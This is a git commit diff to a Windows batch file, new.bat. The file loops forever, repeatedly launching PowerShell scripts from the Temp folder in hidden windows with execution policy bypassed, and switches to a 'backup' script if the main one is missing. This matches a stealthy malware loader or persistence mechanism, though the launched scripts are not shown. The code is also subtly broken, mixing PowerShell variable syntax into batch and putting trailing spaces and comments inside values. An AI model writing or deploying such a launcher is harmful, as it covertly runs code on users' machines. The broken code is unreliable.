5bed35bfb7399a3c983ee60b681c822e58da82f7
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-01-15 14:08:19 +0700

    Update new.bat

--- new.bat
+++ new.bat
@@ -1,9 +1,15 @@
 @echo off
-start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\Update.ps1"
+start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "$env:TEMP\Update.ps1" #online
+set sp1=$env:TEMP\MyScript.ps1 #main
+set sp2=$env:TEMP\RunX.ps1 #backup
 :loop
 timeout /t 3 >nul
-start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\MyScript.ps1"
+if exist "%sp1% " (
+    start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp1%"
+) else (
+    start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp2%"
+)
 timeout /t 60 >nul
-start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\stop.ps1"
+start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "$env:TEMP\stop.ps1" #stop
 timeout /t 1 >nul
 goto loop
